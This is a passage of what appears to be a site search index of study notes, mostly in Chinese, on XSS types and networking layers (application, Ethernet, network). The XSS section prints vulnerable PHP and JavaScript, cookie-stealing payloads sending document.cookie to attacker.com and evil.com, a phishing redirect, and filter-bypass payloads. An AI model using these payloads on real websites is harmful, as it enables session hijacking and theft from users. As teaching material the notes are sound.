<p>\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002</p>","text":""},{"location":"owasp/xss/#reflected_cross-site_scripting","title":"Reflected Cross-Site Scripting","text":"<p>\u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002</p> <ul> <li>\u670d\u52a1\u5668\uff1a\u7406\u89e3\u6210\u6570\u636e</li> <li>\u6d4f\u89c8\u5668\uff1a\u7406\u89e3\u6210\u4ee3\u7801</li> </ul> <p>e.g. \u670d\u52a1\u5668\u7aef\u4ee3\u7801 <pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { \n    // Feedback for end user \n    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; \n} \n?&gt;\n</code></pre> \u6784\u9020\u6076\u610furl <pre><code>https://example.com/search?name=&lt;script&gt;...&lt;/script&gt;\n</code></pre> \u8bf1\u5bfc\u7528\u6237\u8bbf\u95ee\u8be5url</p>"},{"location":"owasp/xss/#persistent_stored_cross-site_scripting","title":"Persistent / Stored Cross-Site Scripting","text":"<p>\u6b64\u7c7b XSS \u4e0d\u9700\u8981\u7528\u6237\u5355\u51fb\u7279\u5b9a URL \u5c31\u80fd\u6267\u884c\u8de8\u7ad9\u811a\u672c\uff0c\u653b\u51fb\u8005\u4e8b\u5148\u5c06\u6076\u610f\u4ee3\u7801\u4e0a\u4f20\u6216\u50a8\u5b58\u5230\u6f0f\u6d1e\u670d\u52a1\u5668\u4e2d\uff0c\u53ea\u8981\u53d7\u5bb3\u8005\u6d4f\u89c8\u5305\u542b\u6b64\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u5c31\u4f1a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u6301\u4e45\u578b XSS \u4e00\u822c\u51fa\u73b0\u5728\u7f51\u7ad9\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u7b49\u4ea4\u4e92\u5904\uff0c\u6076\u610f\u811a\u672c\u5b58\u50a8\u5230\u5ba2\u6237\u7aef\u6216\u8005\u670d\u52a1\u7aef\u7684\u6570\u636e\u5e93\u4e2d\u3002</p> <p>\u670d\u52a1\u5668\u7aef\u4ee3\u7801 <pre><code>&lt;?php\n  if( isset( $_POST[ 'btnSign' ] ) ) {\n    // Get input\n    $message = trim( $_POST[ 'mtxMessage' ] );\n    $name    = trim( $_POST[ 'txtName' ] );\n    // Sanitize message input\n    $message = stripslashes( $message );\n    $message = mysql_real_escape_string( $message );\n    // Sanitize name input\n    $name = mysql_real_escape_string( $name );\n    // Update database\n    $query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n    $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );\n    //mysql_close(); }\n?&gt;\n</code></pre></p>"},{"location":"owasp/xss/#dom_document_object_model_xss","title":"DOM (Document Object Model) XSS","text":"<p>\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u5b8c\u5168\u5728\u5ba2\u6237\u7aef\uff08\u6d4f\u89c8\u5668\uff09\u5b8c\u6210\uff0c\u4e0d\u6d89\u53ca\u670d\u52a1\u5668\u7aef\u53cd\u5c04</p> <pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;DOM-XSS test&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;script&gt;\n      var a=document.URL;\n      document.write(a.substring(a.indexOf(\"a=\")+2,a.length));\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"owasp/xss/#_1","title":"\u5229\u7528\u65b9\u5f0f","text":""},{"location":"owasp/xss/#cookie","title":"\u83b7\u53d6Cookie","text":"<p><pre><code>&lt;script&gt;\nfetch('https://attacker.com/steal?cookie=' + document.cookie);\n&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;\nnew Image().src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie\n&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;\ndocument.location=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie\n&lt;/script&gt;\n</code></pre></p>"},{"location":"owasp/xss/#_2","title":"\u4f1a\u8bdd\u52ab\u6301","text":""},{"location":"owasp/xss/#_3","title":"\u9493\u9c7c","text":"<p>\u91cd\u5b9a\u5411 <pre><code>http://www.bug.com/index.php?search=\"'&gt;&lt;script&gt;document.location.href=\"http://www.evil.com\"&lt;/script&gt;\n</code></pre></p>"},{"location":"owasp/xss/#_4","title":"\u9632\u5fa1 &amp; \u7ed5\u8fc7","text":"<p>\u8fc7\u6ee4\u6389 <code>&lt;script&gt;</code>  - \u5229\u7528 <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code> <pre><code>&lt;svg onload=\"alert(1)\"&gt;&lt;/svg&gt;\n</code></pre></p> <ul> <li>\u5229\u7528 on* \u4e8b\u4ef6 <pre><code>&lt;input name=keyword  value=\"\" onfocus=\"alert()\" autofocus=\"\"&gt;\n</code></pre></li> </ul> <p>\u8fc7\u6ee4\u6389 on \u4e8b\u4ef6 - \u5229\u7528 javascript: \u534f\u8bae\u7ed5\u8fc7</p> <p>html\u8f6c\u4e49 htmlspecialchars() \u5c06\u4ee5\u4e0b\u5b57\u7b26\u8f6c\u4e49\u4e3ahtml\u5b9e\u4f53\uff1a <pre><code>&amp; \u2192 &amp;amp;\n\" \u2192 &amp;quot; (\u5f53\u4f7f\u7528 ENT_QUOTES \u65f6\u4e5f\u4f1a\u8f6c\u4e49\u5355\u5f15\u53f7)\n' \u2192 &amp;#039; (\u4ec5\u5f53\u4f7f\u7528 ENT_QUOTES \u65f6)\n&lt; \u2192 &amp;lt;\n&gt; \u2192 &amp;gt;\n</code></pre></p>"},{"location":"web/Routing/","title":"Routing","text":""},{"location":"web/Routing/#routing","title":"Routing","text":""},{"location":"web/application/","title":"Application","text":""},{"location":"web/application/#application_layer","title":"\u5e94\u7528\u5c42\uff08Application Layer\uff09\u8be6\u89e3","text":"<p>\u5e94\u7528\u5c42\u662fOSI\u6a21\u578b\u7684\u7b2c\u4e03\u5c42\uff08TCP/IP\u6a21\u578b\u7684\u9876\u5c42\uff09\uff0c\u76f4\u63a5\u9762\u5411\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u7f51\u7edc\u670d\u52a1\u7684\u63a5\u53e3\uff0c\u5b9e\u73b0\u5177\u4f53\u529f\u80fd\uff08\u5982\u7f51\u9875\u6d4f\u89c8\u3001\u6587\u4ef6\u4f20\u8f93\u3001\u90ae\u4ef6\u6536\u53d1\uff09\u3002\u4ee5\u4e0b\u662f\u7cfb\u7edf\u5316\u89e3\u6790\uff1a</p>"},{"location":"web/application/#_1","title":"\u4e00\u3001\u5e94\u7528\u5c42\u7684\u6838\u5fc3\u4f5c\u7528","text":"\u529f\u80fd \u8bf4\u660e \u7528\u6237\u4ea4\u4e92 \u63d0\u4f9b\u76f4\u89c2\u7684\u754c\u9762\uff08\u5982\u6d4f\u89c8\u5668\u3001\u90ae\u4ef6\u5ba2\u6237\u7aef\uff09\u4e0e\u7f51\u7edc\u670d\u52a1\u4ea4\u4e92\u3002 \u534f\u8bae\u4e0e\u670d\u52a1\u5b9e\u73b0 \u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u95f4\u7684\u901a\u4fe1\u89c4\u5219\uff08\u5982HTTP\u3001FTP\u3001SMTP\uff09\u3002 \u6570\u636e\u683c\u5f0f\u6807\u51c6\u5316 \u89c4\u8303\u6570\u636e\u7684\u7f16\u7801\u4e0e\u89e3\u6790\uff08\u5982HTML\u3001JSON\u3001XML\uff09\u3002 \u8de8\u5e73\u53f0\u517c\u5bb9\u6027 \u5c4f\u853d\u5e95\u5c42\u7f51\u7edc\u7ec6\u8282\uff0c\u4f7f\u4e0d\u540c\u8bbe\u5907\uff08\u624b\u673a\u3001\u7535\u8111\uff09\u80fd\u8bbf\u95ee\u76f8\u540c\u670d\u52a1\u3002"},{"location":"web/application/#_2","title":"\u4e8c\u3001\u5178\u578b\u5e94\u7528\u5c42\u534f\u8bae","text":""},{"location":"web/application/#1","title":"1. \u57fa\u7840\u670d\u52a1\u534f\u8bae","text":"\u534f\u8bae \u7528\u9014 \u7aef\u53e3 \u793a\u4f8b\u573a\u666f HTTP \u8d85\u6587\u672c\u4f20\u8f93\uff08\u7f51\u9875\u6d4f\u89c8\uff09 80/443 \u8bbf\u95ee<code>https://www.example.com</code> FTP \u6587\u4ef6\u4f20\u8f93 20/21 \u4e0a\u4f20\u6587\u4ef6\u5230\u670d\u52a1\u5668 SMTP \u53d1\u9001\u7535\u5b50\u90ae\u4ef6 25 \u901a\u8fc7Outlook\u53d1\u9001\u90ae\u4ef6 POP3 \u63a5\u6536\u7535\u5b50\u90ae\u4ef6\uff08\u4e0b\u8f7d\u5230\u672c\u5730\uff09 110 \u4ece\u670d\u52a1\u5668\u4e0b\u8f7d\u90ae\u4ef6\u5230\u672c\u5730\u5ba2\u6237\u7aef IMAP \u63a5\u6536\u7535\u5b50\u90ae\u4ef6\uff08\u670d\u52a1\u5668\u7ba1\u7406\uff09 143 \u5728\u624b\u673a\u548c\u7535\u8111\u540c\u6b65\u67e5\u770b\u90ae\u4ef6 DNS \u57df\u540d\u89e3\u6790\uff08IP\u5730\u5740\u67e5\u8be2\uff09 53 \u5c06<code>www.google.com</code>\u89e3\u6790\u4e3a<code>8.8.8.8</code> SSH \u5b89\u5168\u8fdc\u7a0b\u767b\u5f55 22 \u8fdc\u7a0b\u7ba1\u7406Linux\u670d\u52a1\u5668 TELNET \u8fdc\u7a0b\u767b\u5f55 23 \u8fdc\u7a0b\u7ba1\u7406Linux\u670d\u52a1\u5668"},{"location":"web/application/#2","title":"2. \u73b0\u4ee3\u5e94\u7528\u534f\u8bae","text":"\u534f\u8bae \u7528\u9014 \u7279\u70b9 HTTPS \u52a0\u5bc6\u7684HTTP \u4f7f\u7528TLS/SSL\u52a0\u5bc6\uff08\u5982\u94f6\u884c\u7f51\u7ad9\uff09 MQTT \u7269\u8054\u7f51\u8f7b\u91cf\u7ea7\u901a\u4fe1 \u4f4e\u529f\u8017\u3001\u53d1\u5e03-\u8ba2\u9605\u6a21\u5f0f\uff08\u5982\u667a\u80fd\u5bb6\u5c45\uff09 REST \u57fa\u4e8eHTTP\u7684API\u8bbe\u8ba1\u98ce\u683c \u4f7f\u7528JSON/XML\u4f20\u8f93\u6570\u636e\uff08\u5982\u5929\u6c14API\uff09 WebSocket \u5168\u53cc\u5de5\u5b9e\u65f6\u901a\u4fe1 \u4fdd\u6301\u957f\u8fde\u63a5\uff08\u5982\u5728\u7ebf\u804a\u5929\u5ba4\uff09"},{"location":"web/application/#_3","title":"\u4e09\u3001\u5e94\u7528\u5c42\u4e0e\u4e0b\u5c42\u7684\u5173\u7cfb","text":""},{"location":"web/application/#1_tcpudp","title":"1. \u4f9d\u8d56\u4f20\u8f93\u5c42\uff08TCP/UDP\uff09","text":"<ul> <li>TCP\u534f\u8bae\uff1a\u7528\u4e8e\u9700\u8981\u53ef\u9760\u4f20\u8f93\u7684\u670d\u52a1\uff08\u5982HTTP\u3001FTP\u3001SMTP\uff09\u3002  </li> <li>UDP\u534f\u8bae\uff1a\u7528\u4e8e\u5b9e\u65f6\u6027\u8981\u6c42\u9ad8\u7684\u670d\u52a1\uff08\u5982DNS\u67e5\u8be2\u3001\u89c6\u9891\u6d41\uff09\u3002  </li> </ul>"},{"location":"web/application/#2_1","title":"2. \u6570\u636e\u5c01\u88c5\u6d41\u7a0b","text":"<p><pre><code>\u5e94\u7528\u6570\u636e\uff08\u5982HTTP\u8bf7\u6c42\uff09 \u2192 \u4f20\u8f93\u5c42\uff08TCP/UDP\u5934\u90e8\uff09 \u2192 \u7f51\u7edc\u5c42\uff08IP\u5934\u90e8\uff09 \u2192 \u94fe\u8def\u5c42\uff08\u5e27\u5934\u5c3e\uff09\n</code></pre> - \u793a\u4f8b\uff1a   - \u7528\u6237\u8f93\u5165<code>https://www.example.com</code>\u540e\uff1a     1. DNS\u89e3\u6790\u57df\u540d\u2192IP\uff08<code>93.184.216.34</code>\uff09\u3002     2. HTTP\u751f\u6210\u8bf7\u6c42\uff0cTCP\u5c01\u88c5\u4e3a\u6bb5\uff08\u76ee\u6807\u7aef\u53e3443\uff09\u3002     3. IP\u5c42\u6dfb\u52a0\u5730\u5740\uff0c\u94fe\u8def\u5c42\u901a\u8fc7MAC\u5730\u5740\u53d1\u9001\u3002  </p>"},{"location":"web/application/#_4","title":"\u56db\u3001\u5173\u952e\u6280\u672f\u4e0e\u6982\u5ff5","text":""},{"location":"web/application/#1_-","title":"1. \u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u6a21\u578b","text":"<ul> <li>\u5ba2\u6237\u7aef\uff1a\u53d1\u8d77\u8bf7\u6c42\uff08\u5982\u6d4f\u89c8\u5668\u3001\u624b\u673aAPP\uff09\u3002  </li> <li>\u670d\u52a1\u5668\uff1a\u54cd\u5e94\u8bf7\u6c42\uff08\u5982Nginx\u3001Apache\uff09\u3002  </li> </ul>"},{"location":"web/application/#2_p2p","title":"2. P2P\uff08\u5bf9\u7b49\u7f51\u7edc\uff09","text":"<ul> <li>\u7279\u70b9\uff1a\u8282\u70b9\u65e2\u662f\u5ba2\u6237\u7aef\u4e5f\u662f\u670d\u52a1\u5668\uff08\u5982BitTorrent\u3001\u533a\u5757\u94fe\uff09\u3002  </li> </ul>"},{"location":"web/application/#3_api","title":"3. API\uff08\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3\uff09","text":"<ul> <li>\u4f5c\u7528\uff1a\u6807\u51c6\u5316\u670d\u52a1\u8c03\u7528\u65b9\u5f0f\uff08\u5982Twitter API\u83b7\u53d6\u63a8\u6587\uff09\u3002  </li> </ul>"},{"location":"web/application/#4","title":"4. \u6570\u636e\u683c\u5f0f","text":"\u683c\u5f0f \u7528\u9014 \u793a\u4f8b HTML \u7f51\u9875\u7ed3\u6784\u6807\u8bb0 <code>&lt;h1&gt;Hello World&lt;/h1&gt;</code> JSON \u8f7b\u91cf\u7ea7\u6570\u636e\u4ea4\u6362 <code>{\"name\": \"Alice\", \"age\": 25}</code> XML \u7ed3\u6784\u5316\u6570\u636e\u5b58\u50a8 <code>&lt;user&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;/user&gt;</code>"},{"location":"web/application/#_5","title":"\u4e94\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"web/application/#q1dns","title":"Q1\uff1a\u4e3a\u4ec0\u4e48DNS\u5c5e\u4e8e\u5e94\u7528\u5c42\uff1f","text":"<ul> <li>\u7b54\uff1aDNS\u662f\u5e94\u7528\u7a0b\u5e8f\uff08\u5982\u6d4f\u89c8\u5668\uff09\u76f4\u63a5\u8c03\u7528\u7684\u670d\u52a1\uff0c\u901a\u8fc7UDP/TCP\u4f20\u8f93\uff0c\u4f46\u529f\u80fd\u5c5e\u4e8e\u57df\u540d\u89e3\u6790\uff0c\u6545\u5f52\u4e3a\u5e94\u7528\u5c42\u3002</li> </ul>"},{"location":"web/application/#q2httpwebsocket","title":"Q2\uff1aHTTP\u4e0eWebSocket\u7684\u533a\u522b\uff1f","text":"<ul> <li>HTTP\uff1a\u65e0\u72b6\u6001\u3001\u77ed\u8fde\u63a5\uff08\u6bcf\u6b21\u8bf7\u6c42\u9700\u91cd\u65b0\u5efa\u7acb\uff09\u3002  </li> <li>WebSocket\uff1a\u6709\u72b6\u6001\u3001\u957f\u8fde\u63a5\uff08\u9002\u5408\u5b9e\u65f6\u53cc\u5411\u901a\u4fe1\uff09\u3002  </li> </ul>"},{"location":"web/application/#q3","title":"Q3\uff1a\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a\u5e94\u7528\u5c42\u534f\u8bae\uff1f","text":"<ul> <li>\u6b65\u9aa4\uff1a  </li> <li>\u5b9a\u4e49\u6d88\u606f\u683c\u5f0f\uff08\u5982JSON\u5b57\u6bb5\uff09\u3002  </li> <li>\u9009\u62e9\u4f20\u8f93\u5c42\u534f\u8bae\uff08TCP/UDP\uff09\u3002  </li> <li>\u6307\u5b9a\u7aef\u53e3\u53f7\uff08\u9700\u907f\u514d\u51b2\u7a81\uff09\u3002  </li> </ul>"},{"location":"web/application/#_6","title":"\u516d\u3001\u603b\u7ed3","text":"<p>\u5e94\u7528\u5c42\u662f\u7528\u6237\u4e0e\u7f51\u7edc\u4e16\u754c\u7684\u6865\u6881\uff0c\u5176\u6838\u5fc3\u4ef7\u503c\u5728\u4e8e\uff1a 1. \u529f\u80fd\u76f4\u63a5\u53ef\u89c1\uff08\u5982\u7f51\u9875\u3001\u90ae\u4ef6\u3001\u89c6\u9891\uff09\u3002 2. \u534f\u8bae\u9ad8\u5ea6\u591a\u6837\u5316\uff0c\u9002\u5e94\u4e0d\u540c\u573a\u666f\u9700\u6c42\u3002 3. \u5c4f\u853d\u5e95\u5c42\u590d\u6742\u6027\uff0c\u5f00\u53d1\u8005\u53ea\u9700\u5173\u6ce8\u4e1a\u52a1\u903b\u8f91\u3002  </p> <p>\u7406\u89e3\u5e94\u7528\u5c42\u534f\u8bae\u7684\u8bbe\u8ba1\u4e0e\u4ea4\u4e92\uff0c\u662f\u5f00\u53d1\u7f51\u7edc\u5e94\u7528\uff08\u5982APP\u3001\u7f51\u7ad9\uff09\u6216\u6392\u67e5\u670d\u52a1\u95ee\u9898\uff08\u5982API\u8c03\u7528\u5931\u8d25\uff09\u7684\u57fa\u7840\u3002</p>"},{"location":"web/applications/","title":"Application","text":""},{"location":"web/applications/#dns","title":"DNS","text":""},{"location":"web/applications/#dns_uses_udp","title":"DNS uses UDP","text":""},{"location":"web/applications/#dns_message_format","title":"DNS Message Format","text":""},{"location":"web/end-to-end/","title":"End-to-End","text":""},{"location":"web/end-to-end/#ethernet","title":"Ethernet","text":""},{"location":"web/end-to-end/#local_networks","title":"Local Networks","text":"<p>The predominant protocol at Layer 2 is Ethernet.</p>"},{"location":"web/end-to-end/#connecting_local_hosts","title":"Connecting Local Hosts","text":"<p>In reality, a single wire might be used to connect multiple machines. In the local network, the hosts and the router can all be on the same wire. We can abstract even further and note that at Layer 2, the router is really just a machine like any other.</p> <p>A mesh topology is impractical. If a new host joins, we\u2019d have to add a wire connecting it to every other host.  However, a bus topology, where we connect all the computers along a single wire, is pretty common and practical in a local network.</p> <p>The single-wire bus topology introduces the notion of a shared media.</p>"},{"location":"web/end-to-end/#coordinated_approaches","title":"Coordinated Approaches","text":"<p>In a network with a shared medium, there\u2019s a risk that transmissions from different nodes may interfere or collide with each other. To solve this problem, we need a multiple access protocol that ensures that multiple computers can share the link and transmit over it.</p>"},{"location":"web/end-to-end/#multiplexing","title":"Multiplexing","text":"<p>One possible category of approaches is to allocate a fixed portion of resources to each node on the link. There are two ways we could consider dividing up the resources.  - In frequency-division multiplexing, we allocate a different slice of frequencies to each computer. (Consider AM/FM radio or broadcast TV, which divide up frequencies into channels.)  - In time-division multiplexing, we divide time into fixed slots and allocate a slot to every connected node.</p>"},{"location":"web/end-to-end/#taking_turns","title":"Taking Turns","text":"<p>In this category, we\u2019re dynamically partitioning by time, so that nodes use only the time they need during their turn, with no wasted time. There are two ways we could consider having nodes take turns.</p> <ul> <li>In a polling protocol, a centralized coordinator decides when each connected node gets to speak. The coordinator goes to each node one by one and asks if the node has something to say. If the node says yes, the coordinator lets the node speak for some time. If the node says no, the coordinator immediately moves on to the next node.    Bluetooth is a real-world protocol using this idea.</li> <li>The other way is token passing. We have a virtual token that can be passed between nodes, and only the node with the token is allowed to speak. If a node has something to say, it holds onto the token while transmitting, then passes it to the next node. If a node doesn\u2019t have anything to say at the moment, it immediately passes the token to the next node.    IBM Token Ring and FDDI are real-world examples of protocols that use this idea.</li> </ul>"},{"location":"web/end-to-end/#random_access","title":"Random Access","text":"<p>In this approach, we just allow nodes to talk whenever they have something to say, and deal with collisions when they occur. The nodes don\u2019t coordinate between each other, and just send data whenever they have something to send.</p> <p>When the recipient gets a packet, it replies with an ack. If two nodes send data simultaneously, the collision causes their packets to be corrupted, so no ack is sent. If the sender doesn\u2019t see an ack, it waits some random amount of time and re-sends. </p> <p>A more \u201cpolite\u201d variant of this protocol is called Carrier Sense Multiple Access (CSMA). Nodes listen (sensing a signal on the wire) to the shared medium first to see if anybody is speaking, and only start talking when it is quiet.  However, propagation delay can introduce issues.</p> <p>To mitigate this problem, we can use CSMA/CD (Carrier Sense Multiple Access with Collision Detection). In addition to listening before speaking, we also listen while we speak. If you start hearing something while you\u2019re transmitting, you stop immediately.</p> <p>To deal with repeated collisions, CSMA/CD uses binary exponential backoff. Each time we detect a collision on a retransmission attempt, we wait up to twice as long before the next retransmission.  Note that we still randomly choose the retransimssion time, but each time we detect a collision, we choose the random number from a range with a limit that\u2019s twice as high. For example, if we chose a random time in the range [0, 4] and detected a collision, the next random time we choose is in the range [0, 8].</p>"},{"location":"web/end-to-end/#lan_communication_mac_addresses","title":"LAN Communication: MAC Addresses","text":"<p>At Layer 2, every computer has a MAC address (Media Access Control).  MAC addresses are 48 bits long, and are usually written in hexadecimal with colons separating every 2 digits, e.g. <code>f8:ff:c2:2b:36:16</code>. MAC addresses are sometimes called ether addresses or link addresses.</p> <p>MAC addresses are usually permanently hard-coded (\u201cburned in\u201d) on a device,  which is different from IP, where you receive an address when you first join a network, and the address depends on your geographic location.</p>"},{"location":"web/end-to-end/#lan_communication_types","title":"LAN Communication Types","text":"<p>There are different possible destinations in a Layer 2 packet.  - In unicast, the packet is intended to a single recipient.  - In broadcast, the packet is intended for all machines on the local network.  - In multicast, the packet is intended for all machines in the local network that belong to a particular group. Machines can choose to join certain groups to receive packets meant for that group.</p>"},{"location":"web/end-to-end/#ethernet_packet_structure","title":"Ethernet Packet Structure","text":"<p>A data packet in Ethernet is called a frame.</p> <p></p> <p>To broadcast a message, we set the destination MAC to the special address <code>FF:FF:FF:FF:FF:FF</code> (all ones).</p> <p>To multicast a message, we set the destination MAC to the address of that group. Recall that the first two bits of the MAC addresses are flags. Normal addresses allocated to machines always set the first bit to 0, and addresses for groups always set the first bit to 1. </p>"},{"location":"web/end-to-end/#layer_2_networks_with_ethernet","title":"Layer 2 Networks with Ethernet","text":"<p>We could introduce multiple links and build a network entirely using Layer 2. Packets could be forwarded, and machines could even run routing protocols, all exclusively using Layer 2 MAC addresses.</p>"},{"location":"web/internet/","title":"Internet","text":""},{"location":"web/internet/#network_layer","title":"\u7f51\u7edc\u5c42\uff08Network Layer\uff09\u8be6\u89e3","text":"<p>\u7f51\u7edc\u5c42\u662fOSI\u6a21\u578b\u7684\u7b2c\u4e09\u5c42\uff08TCP/IP\u6a21\u578b\u7684\u7f51\u9645\u5c42\uff09\uff0c\u6838\u5fc3\u4efb\u52a1\u662f\u5b9e\u73b0\u8de8\u7f51\u7edc\u7684\u7aef\u5230\u7aef\u6570\u636e\u4f20\u8f93\uff0c\u89e3\u51b3\u4e0d\u540c\u7f51\u7edc\u95f4\u7684\u8def\u7531\u4e0e\u5bfb\u5740\u95ee\u9898\u3002\u4ee5\u4e0b\u662f\u7cfb\u7edf\u5316\u7684\u6846\u67b6\u89e3\u6790\uff1a</p>"},{"location":"web/internet/#_1","title":"\u4e00\u3001\u7f51\u7edc\u5c42\u7684\u6838\u5fc3\u529f\u80fd","text":"\u529f\u80fd \u8bf4\u660e \u903b\u8f91\u5bfb\u5740 \u5206\u914dIP\u5730\u5740\uff08IPv4/IPv6\uff09\u552f\u4e00\u6807\u8bc6\u4e3b\u673a\u548c\u7f51\u7edc\u3002 \u8def\u7531\u9009\u62e9 \u901a\u8fc7\u8def\u7531\u534f\u8bae\uff08\u5982OSPF\u3001BGP\uff09\u9009\u62e9\u6700\u4f18\u8def\u5f84\u8f6c\u53d1\u6570\u636e\u5305\u3002 \u5206\u7ec4\u5c01\u88c5\u4e0e\u5206\u7247 \u5c06\u4e0a\u5c42\u6570\u636e\u5c01\u88c5\u4e3aIP\u6570\u636e\u62a5\uff0c\u5fc5\u8981\u65f6\u5206\u7247\u4ee5\u9002\u5e94\u4e0d\u540c\u94fe\u8def\u7684MTU\u3002 \u8de8\u7f51\u7edc\u901a\u4fe1 \u89e3\u51b3\u5f02\u6784\u7f51\u7edc\uff08\u5982\u4ee5\u592a\u7f51\u3001Wi-Fi\u30015G\uff09\u4e92\u8054\u95ee\u9898\u3002 \u62e5\u585e\u63a7\u5236 \u901a\u8fc7TTL\uff08\u751f\u5b58\u65f6\u95f4\uff09\u7b49\u673a\u5236\u907f\u514d\u6570\u636e\u5305\u65e0\u9650\u5faa\u73af\u3002"},{"location":"web/internet/#_2","title":"\u4e8c\u3001\u6838\u5fc3\u534f\u8bae\u4e0e\u6280\u672f","text":""},{"location":"web/internet/#1_ipinternet_protocol","title":"1. IP\u534f\u8bae\uff08Internet Protocol\uff09","text":"<ul> <li>IPv4\uff1a32\u4f4d\u5730\u5740\uff0c\u4f7f\u7528\u70b9\u5206\u5341\u8fdb\u5236\uff08\u5982<code>192.168.1.1</code>\uff09\u3002  </li> <li>\u5173\u952e\u5b57\u6bb5\uff1a\u7248\u672c\u3001TTL\u3001\u534f\u8bae\u53f7\uff08\u5982TCP=6\uff09\u3001\u6e90/\u76ee\u6807IP\u5730\u5740\u3002  </li> <li>IPv6\uff1a128\u4f4d\u5730\u5740\uff0c\u5341\u516d\u8fdb\u5236\u8868\u793a\uff08\u5982<code>2001:0db8::1</code>\uff09\uff0c\u89e3\u51b3\u5730\u5740\u8017\u5c3d\u95ee\u9898\u3002  </li> </ul>"},{"location":"web/internet/#2","title":"2. \u8f85\u52a9\u534f\u8bae","text":"\u534f\u8bae \u4f5c\u7528 ICMP \u4f20\u9012\u7f51\u7edc\u72b6\u6001\u4fe1\u606f\uff08\u5982<code>ping</code>\u3001<code>traceroute</code>\uff09\u3002 ARP \u5c06IP\u5730\u5740\u89e3\u6790\u4e3aMAC\u5730\u5740\uff08\u5c40\u57df\u7f51\u5185\uff09\u3002 RARP \u53cd\u5411\u5730\u5740\u89e3\u6790\u534f\u8bae\uff08\u5df2\u6dd8\u6c70\uff0c\u7531DHCP\u66ff\u4ee3\uff09\u3002 \u8def\u7531\u534f\u8bae - \u5185\u90e8\u7f51\u5173\u534f\u8bae\uff08IGP\uff09\uff1aOSPF\u3001RIP\uff08\u540c\u4e00\u81ea\u6cbb\u7cfb\u7edf\u5185\u8def\u7531\uff09\u3002- \u5916\u90e8\u7f51\u5173\u534f\u8bae\uff08EGP\uff09\uff1aBGP\uff08\u8de8\u81ea\u6cbb\u7cfb\u7edf\u8def\u7531\uff09\u3002"},{"location":"web/internet/#ippacket","title":"\u4e09\u3001IP\u6570\u636e\u62a5\uff08Packet\uff09\u7ed3\u6784","text":""},{"location":"web/internet/#ipv4","title":"IPv4\u6570\u636e\u62a5\u683c\u5f0f","text":"<p><pre><code>| \u7248\u672c (4) | \u9996\u90e8\u957f\u5ea6 | \u670d\u52a1\u7c7b\u578b | \u603b\u957f\u5ea6 |\n| \u6807\u8bc6\u7b26       | \u6807\u5fd7\u4f4d | \u5206\u7247\u504f\u79fb |\n| \u751f\u5b58\u65f6\u95f4 (TTL) | \u534f\u8bae\u53f7 | \u9996\u90e8\u6821\u9a8c\u548c |\n| \u6e90IP\u5730\u5740 (32\u4f4d)         |\n| \u76ee\u6807IP\u5730\u5740 (32\u4f4d)        |\n| \u53ef\u9009\u5b57\u6bb5\uff08\u5982\u65f6\u95f4\u6233\uff09       |\n| \u6570\u636e\uff08\u4e0a\u5c42\u534f\u8bae\u62a5\u6587\uff09        |\n</code></pre> - \u5173\u952e\u5b57\u6bb5\u8bf4\u660e\uff1a   - 